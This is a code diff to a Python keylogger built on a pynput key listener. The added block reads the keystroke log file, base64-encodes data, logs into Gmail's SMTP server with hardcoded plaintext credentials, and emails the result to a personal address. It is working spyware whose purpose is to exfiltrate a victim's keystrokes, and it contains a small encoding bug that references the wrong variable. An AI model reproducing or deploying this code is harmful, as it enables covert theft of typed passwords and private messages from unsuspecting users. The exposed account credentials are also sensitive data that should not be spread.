@@ -42,6 +42,28 @@ def on_press(key):
         #Although the file is sent in base 64 we can decode it in multiple ways
         #---------------------------------------------------------------------------------------
 
+        #Send the log file:
+        file2 = "key_log.txt"
+        f2=open(file2,'rb')
+        data2=f2.read()
+        data2=base64.b64encode(data) #Convert binary to base 64 
+        f2.close()
+        #os.remove(file)             # Remove the snap
+
+        s = smtplib.SMTP('smtp.gmail.com', 587)   
+        s.starttls()
+        # [!]Remember! You need to enable 'Allow less secure apps' in your Google account
+        # Enter your gmail username and password
+        s.login("random33prueba1234@gmail.com", "StarW4r5")
+        #
+    
+        # message to be sent 
+        message = data2 # data variable has the base64 string of screenshot
+    
+        # Sender email, recipient email 
+        s.sendmail("random33prueba1234@gmail.com", "pablolopez2733@gmail.com", message) 
+        s.quit()
+
 
 
 with Listener(on_press=on_press) as listener:
